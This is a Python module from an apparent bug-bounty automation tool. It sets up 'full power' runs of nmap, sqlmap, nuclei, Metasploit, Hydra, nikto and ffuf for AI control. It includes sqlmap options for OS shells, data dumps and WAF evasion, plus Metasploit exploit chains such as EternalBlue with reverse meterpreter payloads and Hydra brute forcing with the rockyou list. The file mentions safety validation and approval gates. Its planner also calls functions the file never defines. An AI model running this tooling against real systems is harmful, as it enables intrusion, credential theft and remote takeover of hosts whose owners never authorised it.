"""
BountyOS - Full-Power Tool Configurations (Aggressive Mode)

In passive mode: conservative defaults, read-only, minimal footprint.
In aggressive mode: FULL POWER — every capability unlocked.

Nmap:    Full NSE scripts, OS detection, version intensity 9, SYN scan
Sqlmap:  Level 5 Risk 3, all injection types, tamper scripts, OS shell
Nuclei:  Full template library, all severities, CVE + exploit templates
Metasploit: AI-controlled via resource scripts, module + payload selection
Hydra:   Full brute-force, all protocols
Nikto:   Full plugin set, all checks
WPScan:  All enumeration modes, API token support
"""

import asyncio
import json
import os
import shlex
import re
import tempfile
from typing import AsyncIterator, Optional

from api.tools.safety import validate_or_raise, validate_msf_command
from api.database import session_ctx
from api.models import ScanEvent, ScanPhase


def _log(scan_id: str, tool: str, msg: str, level: str = "info", phase: str = "exploit"):
    with session_ctx() as s:
        s.add(ScanEvent(
            scan_id=scan_id, phase=phase, tool=tool,
            level=level, message=msg,
        ))
        s.commit()


async def _stream(cmd: str | list[str], scan_id: str, tool: str, timeout: int,
                  finding_patterns: list, phase: str = "exploit") -> AsyncIterator[dict]:
    """Safe streaming subprocess with validator gate and argv execution."""
    argv = [str(x) for x in cmd] if isinstance(cmd, list) else shlex.split(cmd)
    if not argv:
        raise ValueError("empty command")
    binary_name = os.path.basename(argv[0])
    tool_aliases = {"metasploit": {"msfconsole"}}
    allowed_binaries = {tool, *tool_aliases.get(tool, set())}
    if binary_name not in allowed_binaries:
        raise ValueError("tool command does not match requested tool")
    validate_or_raise(shlex.join(argv))  # SAFETY CHECK — raises if blocked

    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            decoded = line.decode(errors="replace").rstrip()
            if not decoded:
                continue
            level = "finding" if any(re.search(p, decoded, re.I) for p in finding_patterns) else "info"
            ev = {
                "scan_id": scan_id, "phase": phase, "tool": tool,
                "level": level, "message": decoded, "raw": decoded,
            }
            _log(scan_id, tool, decoded, level, phase)
            yield ev
        try:
            await asyncio.wait_for(proc.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            yield {"scan_id": scan_id, "phase": phase, "tool": tool,
                   "level": "warn", "message": f"{tool} timed out after {timeout}s"}
    except ValueError as e:
        # Safety validator blocked this command
        err = str(e)
        _log(scan_id, tool, err, "error", phase)
        yield {"scan_id": scan_id, "phase": phase, "tool": tool, "level": "error", "message": err}
    except FileNotFoundError:
        yield {"scan_id": scan_id, "phase": phase, "tool": tool,
                "level": "error", "message": f"{tool} not found in PATH"}
    except Exception as e:
        yield {"scan_id": scan_id, "phase": phase, "tool": tool,
                "level": "error", "message": f"{tool} error: {e}"}


# ═══════════════════════════════════════════════════════════════════════════════
# NMAP — Full power
# ═══════════════════════════════════════════════════════════════════════════════

async def nmap_full(
    scan_id: str, target: str,
    ports: str = "-",                          # ALL ports
    timing: str = "T4",
    scripts: str = "default,safe,vuln,exploit,auth,discovery,intrusive",
    os_detect: bool = True,
    version_intensity: int = 9,
    extra_args: str = "",
    stealth: bool = False,
) -> AsyncIterator[dict]:
    """
    Nmap at full power:
    - All ports (-p-)
    - Version detection at max intensity
    - Full NSE script suite including vuln and exploit scripts
    - OS detection with aggressive guessing
    - SYN scan in stealth mode
    """
    flags = []
    if stealth:
        flags.append("-sS")          # SYN scan (stealth)
    else:
        flags.append("-sV")          # Service version detection
        flags.append("-sC")          # Default scripts

    flags += [
        f"--version-intensity {version_intensity}",
        f"-{timing}",
        f"--script={shlex.quote(scripts)}",
        "--open",
    ]
    if os_detect:
        flags.append("-O")
        flags.append("--osscan-guess")

    if ports != "-":
        flags.append(f"-p {shlex.quote(ports)}")
    else:
        flags.append("-p-")          # All 65535 ports

    if extra_args:
        flags.append(extra_args)

    cmd = f"nmap {' '.join(flags)} {shlex.quote(target)}"

    yield {"scan_id": scan_id, "phase": "recon", "tool": "nmap",
           "level": "info", "message": f"▶ nmap FULL POWER on {target}"}
    yield {"scan_id": scan_id, "phase": "recon", "tool": "nmap",
           "level": "info", "message": f"CMD: {cmd}"}

    finding_pats = [
        r"\d+/tcp\s+open", r"\d+/udp\s+open",
        r"\|\s+VULNERABLE", r"CVE-\d{4}-\d+",
        r"State: VULNERABLE", r"risk factor",
    ]
    async for ev in _stream(cmd, scan_id, "nmap", 900, finding_pats, "recon"):
        yield ev


# ═══════════════════════════════════════════════════════════════════════════════
# SQLMAP — Full power
# ═══════════════════════════════════════════════════════════════════════════════

SQLMAP_TAMPER_SCRIPTS = [
    "apostrophemask", "apostrophenullencode", "appendnullbyte",
    "base64encode", "between", "bluecoat", "chardoubleencode",
    "charencode", "charunicodeencode", "concat2concatws",
    "equaltolike", "greatest", "halfversionedmorekeywords",
    "ifnull2ifisnull", "modsecurityversioned", "modsecurityzeroversioned",
    "multiplespaces", "nonrecursivereplacement", "percentage",
    "randomcase", "randomcomments", "securesphere", "space2comment",
    "space2dash", "space2hash", "space2morehash", "space2mssqlblank",
    "space2mssqlhash", "space2mysqlblank", "space2mysqldash",
    "space2plus", "space2randomblank", "unionalltounion",
    "unmagicquotes", "uppercase", "versionedkeywords",
    "versionedmorekeywords", "xforwardedfor",
]

async def sqlmap_full(
    scan_id: str, target: str,
    level: int = 5,
    risk: int = 3,
    technique: str = "BEUSTQ",        # All: Boolean, Error, Union, Stacked, Time, Query
    tamper: str = "randomcase,space2comment,between,charencode",
    forms: bool = True,
    crawl: int = 3,
    threads: int = 10,
    dump: bool = False,
    os_shell: bool = False,
    extra_args: str = "",
) -> AsyncIterator[dict]:
    """
    Sqlmap at full power:
    - Level 5 Risk 3 (maximum)
    - All injection techniques
    - Tamper scripts for WAF bypass
    - Form auto-discovery
    - Crawling for parameter discovery
    - Optional OS shell attempt (requires approval via aggressive agent)
    """
    url = target if target.startswith("http") else f"https://{target}"
    flags = [
        f"--level={level}",
        f"--risk={risk}",
        f"--technique={technique}",
        f"--tamper={tamper}",
        f"--threads={threads}",
        "--batch",
        "--random-agent",
        "--output-dir=/tmp/sqlmap_bountyos",
    ]
    if forms:
        flags.append("--forms")
    if crawl > 0:
        flags.append(f"--crawl={crawl}")
    if dump:
        flags.append("--dump")
    if os_shell:
        flags.append("--os-shell")
    if extra_args:
        flags.append(extra_args)

    cmd = f"sqlmap -u {shlex.quote(url)} {' '.join(flags)}"

    yield {"scan_id": scan_id, "phase": "vulnscan", "tool": "sqlmap",
           "level": "info", "message": f"▶ sqlmap FULL POWER on {url} (level={level} risk={risk} technique={technique})"}
    yield {"scan_id": scan_id, "phase": "vulnscan", "tool": "sqlmap",
           "level": "info", "message": f"CMD: {cmd}"}

    finding_pats = [
        r"is vulnerable", r"injectable", r"sql injection",
        r"\[WARNING\].*parameter", r"payload:", r"Type:",
        r"backend DBMS:", r"current database:", r"current user:",
        r"available databases", r"table entries",
    ]
    async for ev in _stream(cmd, scan_id, "sqlmap", 900, finding_pats, "vulnscan"):
        yield ev


# ═══════════════════════════════════════════════════════════════════════════════
# NUCLEI — Full power
# ═══════════════════════════════════════════════════════════════════════════════

async def nuclei_full(
    scan_id: str, target: str,
    severity: str = "info,low,medium,high,critical",
    tags: str = "",                    # empty = ALL templates
    exclude_tags: str = "dos",         # never run DoS templates
    rate_limit: int = 150,
    concurrency: int = 25,
    timeout: int = 10,
    update_templates: bool = False,
    extra_args: str = "",
) -> AsyncIterator[dict]:
    """
    Nuclei at full power:
    - ALL severity levels
    - ALL template categories (CVE, exploit, misconfig, exposure, takeover, etc.)
    - Excludes only DoS templates (would cause outage)
    - High concurrency for speed
    """
    url = target if target.startswith("http") else f"https://{target}"
    flags = [
        f"-severity {severity}",
        f"-rl {rate_limit}",
        f"-c {concurrency}",
        f"-timeout {timeout}",
        "-silent",
        "-json",
        f"-etags {exclude_tags}",
    ]
    if tags:
        flags.append(f"-tags {shlex.quote(tags)}")
    if update_templates:
        flags.append("-update-templates")
    if extra_args:
        flags.append(extra_args)

    cmd = f"nuclei -u {shlex.quote(url)} {' '.join(flags)}"

    yield {"scan_id": scan_id, "phase": "vulnscan", "tool": "nuclei",
           "level": "info", "message": f"▶ nuclei FULL POWER on {url} (all templates, severity={severity})"}
    yield {"scan_id": scan_id, "phase": "vulnscan", "tool": "nuclei",
           "level": "info", "message": f"CMD: {cmd}"}

    finding_pats = [r"\[critical\]", r"\[high\]", r"\[medium\]", r"\[low\]", r"\[info\]"]

    async for ev in _stream(cmd, scan_id, "nuclei", 1800, finding_pats, "vulnscan"):
        # Parse JSON nuclei output
        try:
            data = json.loads(ev.get("raw", ev["message"]))
            sev  = data.get("info", {}).get("severity", "?").upper()
            name = data.get("info", {}).get("name", "?")
            url_ = data.get("matched-at", "?")
            ev["message"] = f"[{sev}] {name} — {url_}"
            ev["level"]   = "finding"
        except Exception:
            pass
        yield ev


# ═══════════════════════════════════════════════════════════════════════════════
# METASPLOIT — AI-controlled via resource scripts
# ═══════════════════════════════════════════════════════════════════════════════

# Module selection based on service/version fingerprinting
MSF_MODULE_MAP = {
    # Service → list of (module, payload, condition_hint)
    "apache_tomcat": [
        ("exploit/multi/http/tomcat_mgr_upload", "java/meterpreter/reverse_tcp", "manager app exposed"),
        ("exploit/multi/http/apache_tomcat_ajp_file_read", None, "CVE-2020-1938 Ghostcat"),
    ],
    "ssh": [
        ("auxiliary/scanner/ssh/ssh_version", None, "fingerprint only"),
        ("auxiliary/scanner/ssh/ssh_login", None, "brute force with wordlist"),
    ],
    "smb": [
        ("exploit/windows/smb/ms17_010_eternalblue", "windows/x64/meterpreter/reverse_tcp", "EternalBlue"),
        ("auxiliary/scanner/smb/smb_ms17_010", None, "check only"),
    ],
    "ftp": [
        ("auxiliary/scanner/ftp/anonymous", None, "anonymous login check"),
        ("exploit/unix/ftp/vsftpd_234_backdoor", "cmd/unix/interact", "vsftpd backdoor"),
    ],
    "http": [
        ("auxiliary/scanner/http/http_version", None, "version only"),
        ("auxiliary/scanner/http/files_dir", None, "directory scan"),
    ],
    "mysql": [
        ("auxiliary/scanner/mysql/mysql_version", None, "fingerprint"),
        ("auxiliary/scanner/mysql/mysql_login", None, "brute force"),
    ],
    "redis": [
        ("auxiliary/scanner/redis/redis_server", None, "unauthenticated check"),
    ],
    "mongodb": [
        ("auxiliary/scanner/mongodb/mongodb_login", None, "auth check"),
    ],
}


def build_msf_resource_script(
    target: str,
    module: str,
    payload: Optional[str],
    lhost: str,
    lport: int,
    options: dict,
    check_only: bool = True,
) -> str:
    """
    Build a Metasploit resource (.rc) script for AI-controlled execution.
    check_only=True: just check vulnerability, don't exploit.
    check_only=False: full exploit (requires approval).
    """
    lines = [
        f"use {module}",
        f"set RHOSTS {target}",
        f"set RHOST {target}",
    ]
    if payload and not check_only:
        lines.append(f"set PAYLOAD {payload}")
        lines.append(f"set LHOST {lhost}")
        lines.append(f"set LPORT {lport}")

    for k, v in options.items():
        lines.append(f"set {k} {v}")

    lines.append("set VERBOSE true")

    if check_only and module.startswith("exploit/"):
        lines.append("check")
    else:
        lines.append("run -j")       # run in background job
        lines.append("sleep 10")     # wait for result
        lines.append("sessions -l")  # list opened sessions

    lines.append("exit -y")
    return "\n".join(lines)


async def metasploit_run(
    scan_id: str,
    target: str,
    module: str,
    payload: Optional[str] = None,
    options: dict = None,
    check_only: bool = True,
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> AsyncIterator[dict]:
    """
    Run a Metasploit module via resource script.
    AI calls this with specific module based on service fingerprinting.
    check_only=True for vulnerability checking (no approval needed).
    check_only=False for exploitation (REQUIRES approval via aggressive agent).
    """
    resource_script = build_msf_resource_script(
        target, module, payload, lhost, lport, options or {}, check_only
    )

    # Validate the resource script
    ok, reason = validate_msf_command(resource_script)
    if not ok:
        yield {"scan_id": scan_id, "phase": "exploit", "tool": "metasploit",
               "level": "error", "message": f"SAFETY BLOCK: {reason}"}
        return

    # Write resource script to temp file
    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc',
                                    prefix='bountyos_msf_', delete=False) as f:
        f.write(resource_script)
        rc_path = f.name

    action = "CHECK" if check_only else "EXPLOIT"
    yield {"scan_id": scan_id, "phase": "exploit", "tool": "metasploit",
           "level": "info",
           "message": f"▶ Metasploit [{action}] module={module} target={target}"}
    yield {"scan_id": scan_id, "phase": "exploit", "tool": "metasploit",
           "level": "info", "message": f"Resource script:\n{resource_script}"}

    cmd = f"msfconsole -q -r {shlex.quote(rc_path)}"
    finding_pats = [
        r"session.*opened", r"Meterpreter", r"VULNERABLE",
        r"succeeded", r"The target.*appears.*vulnerable",
        r"\[\+\]", r"shell opened",
    ]

    try:
        async for ev in _stream(cmd, scan_id, "metasploit", 300, finding_pats, "exploit"):
            yield ev
    finally:
        try:
            os.unlink(rc_path)
        except Exception:
            pass

    yield {"scan_id": scan_id, "phase": "exploit", "tool": "metasploit",
           "level": "info", "message": "■ Metasploit module complete"}


# ═══════════════════════════════════════════════════════════════════════════════
# HYDRA — Full brute-force power
# ═══════════════════════════════════════════════════════════════════════════════

HYDRA_PROTOCOLS = [
    "ssh", "ftp", "http-get", "http-post-form", "https-get", "https-post-form",
    "smtp", "pop3", "imap", "smb", "rdp", "mysql", "postgres", "vnc",
    "telnet", "ldap2", "ldap3", "redis", "mongodb",
]

async def hydra_full(
    scan_id: str,
    target: str,
    protocol: str,
    userlist: str = "/usr/share/wordlists/metasploit/unix_users.txt",
    passlist: str = "/usr/share/wordlists/rockyou.txt",
    port: Optional[int] = None,
    threads: int = 64,
    extra_args: str = "",
) -> AsyncIterator[dict]:
    """Hydra full brute-force — 64 threads, rockyou wordlist."""
    flags = [f"-L {shlex.quote(userlist)}", f"-P {shlex.quote(passlist)}",
             f"-t {threads}", "-q"]
    if port:
        flags.append(f"-s {port}")
    if extra_args:
        flags.append(extra_args)

    cmd = f"hydra {' '.join(flags)} {shlex.quote(target)} {shlex.quote(protocol)}"

    yield {"scan_id": scan_id, "phase": "exploit", "tool": "hydra",
           "level": "info", "message": f"▶ hydra brute-force [{protocol}] on {target}"}

    finding_pats = [r"login:", r"password:", r"\[.*\].*host:"]
    async for ev in _stream(cmd, scan_id, "hydra", 600, finding_pats, "exploit"):
        yield ev


# ═══════════════════════════════════════════════════════════════════════════════
# NIKTO — Full plugin scan
# ═══════════════════════════════════════════════════════════════════════════════

async def nikto_full(
    scan_id: str, target: str,
    plugins: str = "ALL",
    extra_args: str = "",
) -> AsyncIterator[dict]:
    """Nikto with ALL plugins enabled."""
    url = target if target.startswith("http") else f"https://{target}"
    cmd = f"nikto -h {shlex.quote(url)} -Plugins {shlex.quote(plugins)} -nointeractive {extra_args}"

    yield {"scan_id": scan_id, "phase": "vulnscan", "tool": "nikto",
           "level": "info", "message": f"▶ nikto ALL plugins on {url}"}

    finding_pats = [r"\+\s", r"OSVDB", r"CVE-", r"vulnerability"]
    async for ev in _stream(cmd, scan_id, "nikto", 600, finding_pats, "vulnscan"):
        yield ev


# ═══════════════════════════════════════════════════════════════════════════════
# FFUF — Full fuzzing power
# ═══════════════════════════════════════════════════════════════════════════════

WORDLISTS_PRIORITY = [
    "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
    "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt",
    "/usr/share/wordlists/dirb/big.txt",
    "/usr/share/wordlists/dirb/common.txt",
    "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt",
]

def _best_wordlist() -> str:
    for wl in WORDLISTS_PRIORITY:
        if os.path.isfile(wl):
            return wl
    return "/usr/share/wordlists/dirb/common.txt"


async def ffuf_full(
    scan_id: str, target: str,
    wordlist: Optional[str] = None,
    extensions: str = "php,html,js,json,txt,bak,zip,xml,asp,aspx,jsp",
    threads: int = 100,
    rate: int = 500,
    recursion: bool = True,
    extra_args: str = "",
) -> AsyncIterator[dict]:
    """ffuf at full speed — largest available wordlist, extensions, recursion."""
    wl  = wordlist or _best_wordlist()
    url = target if target.startswith("http") else f"https://{target}"
    if not url.endswith("/FUZZ"):
        url = url.rstrip("/") + "/FUZZ"

    flags = [
        f"-u {shlex.quote(url)}",
        f"-w {shlex.quote(wl)}",
        f"-t {threads}",
        f"-rate {rate}",
        f"-e {shlex.quote(extensions)}",
        "-mc 200,201,204,301,302,307,401,403,405,500",
        "-ac",       # auto-calibrate
        "-sf",       # stop on 403 false positives
    ]
    if recursion:
        flags.append("-recursion")
        flags.append("-recursion-depth 3")
    if extra_args:
        flags.append(extra_args)

    cmd = f"ffuf {' '.join(flags)}"

    yield {"scan_id": scan_id, "phase": "vulnscan", "tool": "ffuf",
           "level": "info", "message": f"▶ ffuf FULL POWER on {url} (wordlist={os.path.basename(wl)})"}

    finding_pats = [r"Status: 200", r"Status: 201", r"Status: 301", r"Status: 403"]
    async for ev in _stream(cmd, scan_id, "ffuf", 600, finding_pats, "vulnscan"):
        yield ev


# ═══════════════════════════════════════════════════════════════════════════════
# Target-adaptive tool selector
# AI uses this to pick the right tools based on what was discovered
# ═══════════════════════════════════════════════════════════════════════════════

def select_tools_for_target(fingerprint: dict) -> list:
    """
    Given a fingerprint dict (open_ports, technologies, cms, ssl_info),
    return an ordered list of (tool_func, kwargs) tuples the AI should execute.

    fingerprint = {
        "open_ports": [80, 443, 22, 8080],
        "technologies": ["Apache", "PHP", "MySQL"],
        "cms": "WordPress",
        "ssl": True,
        "login_forms": ["/wp-login.php"],
    }
    """
    plan = []
    ports  = fingerprint.get("open_ports", [])
    techs  = [t.lower() for t in fingerprint.get("technologies", [])]
    cms    = fingerprint.get("cms", "").lower()

    # Always: full nuclei scan
    plan.append(("nuclei_full", {"severity": "info,low,medium,high,critical"}))

    # Web present → nikto + ffuf
    if any(p in ports for p in [80, 443, 8080, 8443, 8888]):
        plan.append(("nikto_full",  {}))
        plan.append(("ffuf_full",   {"recursion": True}))

    # MySQL/MariaDB visible → sqlmap
    if any(t in techs for t in ["mysql", "mariadb", "php"]):
        plan.append(("sqlmap_full", {"level": 5, "risk": 3}))

    # WordPress → wpscan
    if cms == "wordpress":
        plan.append(("wpscan_full", {}))

    # SSH open → auth check
    if 22 in ports:
        plan.append(("hydra_full", {"protocol": "ssh"}))

    # FTP open → anonymous check + brute
    if 21 in ports:
        plan.append(("hydra_full", {"protocol": "ftp"}))

    # SMB open → enum4linux + eternalblue check
    if any(p in ports for p in [445, 139]):
        plan.append(("msf_check", {"module": "auxiliary/scanner/smb/smb_ms17_010"}))

    return plan
